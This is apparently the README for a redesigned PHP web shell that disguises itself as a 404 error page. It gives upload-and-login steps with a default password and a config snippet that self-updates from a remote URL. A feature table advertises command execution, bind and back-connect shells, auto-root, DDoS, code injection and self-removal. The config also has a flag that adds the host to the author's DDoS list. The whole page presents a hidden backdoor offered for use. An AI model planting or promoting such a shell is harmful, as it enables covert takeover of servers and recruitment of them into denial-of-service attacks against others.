![alt text](http://sanitas.co.uk/wp-content/uploads/2013/12/pen-testing-symbol-182x195_182px_195px_cropped.png "Pentesting")
## Responsive 404 Shell ( Redesign by Codelyfe )

![alt text](https://html5hive.org/wp-content/uploads/2015/11/bootstrap-logo.jpg "BOOTSTRAP")
![alt text](http://getbootstrap.com/2.3.2/assets/img/bs-docs-responsive-illustrations.png "Responsive Web Design")



## Original git ( https://github.com/KyleBoyer/404Shell )

## How to Install

1. Download to device
2. Unzip
3. Upload to server
4. Direct URL to http://www.YOURDOMAIN.com/404sx.php
5. Press "Tab" to find "Password" input
6. Login using default password "pw"
7. Change Password in "Shell Settings"
8. Have a blast using this shell. 

## CDN
```
<!--BOOTSTRAP & JQUERY CDN-->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<!--BOOTSTRAP & JQUERY CDN-->
```


## Change password after every update
```
<?php
$pass               = md5("pw");
$version            = 3.71;
$adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
$checkforupdates    = true;
$helpsupportbooter  = false; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
$checkforupdatesurl = "https://raw.githubusercontent.com/codelyfe/Responsive-404Shell/master/404sx.php";
$mtime     = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
?>
```

| Features      | Working       |
| ------------- |:-------------:|
| File Manager  | X             |
|Process Manager| X             |
| MySQL Manager | X             |
| MySQL Up & Dw | X             |
| PHP Variable  | X             |
|PHP Obfuscator | X             |
| Eval PHP Code | X             |
| Code Injector | X             |
| Code Ejector  | X             |
| Fuzz Server   | X             |
| DDos          | X             |
| Exec. Cmd     | X             |
| Bind Port     | X             |
| Back Connect  | X             |
| Auto Root     | X             |
| Security Info | X             |
| Email         | X             |
| String Tools  | X             |
| Port Scan     | X             |
| Remove Self   | X             |

## Mobile Friendly 

## Last Modified

**Dec. 25 2016**







